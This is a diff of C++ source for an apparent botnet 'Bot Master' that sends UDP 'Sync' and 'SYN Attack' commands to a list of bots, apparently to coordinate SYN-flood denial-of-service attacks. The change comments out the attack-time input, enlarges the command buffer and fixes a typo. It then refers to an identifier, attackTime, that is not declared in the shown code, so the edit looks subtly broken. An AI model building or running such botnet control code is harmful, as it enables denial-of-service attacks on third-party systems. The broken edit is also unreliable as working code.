@@ -19,7 +19,7 @@ using namespace std;
 
 void syncCommand(char* cmd);
 void attackCommand(char* cmd);
-char  attack_time[256];
+//char  attack_time[256];
 
 
 
@@ -32,7 +32,7 @@ int main()
 	int UDPPort = 25000;  // UPD port used to send the command to bots;
 	int UDPRepeatNum = 1;    // Send UDPRepeatNum commands for one time;
 	struct hostent *hostinfo = NULL; //Host name
-	cout << "Bort Master started" << endl << endl;
+	cout << "Bot Master started" << endl << endl;
 
 	// Create a UDP socket to send the commands to bots;
 	cout << "Preparing socket UDPSocket with port <" << UDPPort << ">...";
@@ -57,11 +57,11 @@ int main()
 		{
 			cout << "Input the command(1-Sync, 2-SYNAttack): ";
 			cin  >> commandType;
-			if (commandType == 2){
-				cout << "Attack time: XX:XX:XX.XXXXXX" << endl;
-				cin.getline(attack_time,256);   // Digest the last newline
-				cin.getline(attack_time,256);   // Get the real attack_time
-			}
+			//if (commandType == 2){
+			//	cout << "Attack time: XX:XX:XX.XXXXXX" << endl;
+			//	cin.getline(attack_time,256);   // Digest the last newline
+			//	cin.getline(attack_time,256);   // Get the real attack_time
+			//}
 		} while(commandType < 0 || commandType > 2);
 		// Send the command to bots;
 		for (int i = 0; i < botNum; i++)
@@ -79,7 +79,7 @@ int main()
 			cout << "Done" << endl;
 
 			// Sending a command;
-			char command[256];
+			char command[1024];
 			if (commandType == 1)
 				syncCommand(command);
 			else
@@ -87,7 +87,7 @@ int main()
 			memset(messageBuffer, 0, messageBufferSize);  // Empty the Buffer;
 			sprintf(messageBuffer, "%s", command);
 
-			cout << "fine";
+			cout << "fine"<<endl;
 			for (int i = 0; i < UDPRepeatNum; i++)
 			{
 				cout << "Sending a command: [" << command << "]...";
@@ -111,5 +111,5 @@ void syncCommand(char* cmd)
 
 void attackCommand(char *cmd)
 {
-	sprintf(cmd,"2 - SYN Attack %s", attack_time);
+	sprintf(cmd,"2 - SYN Attack %s", attackTime);
 }
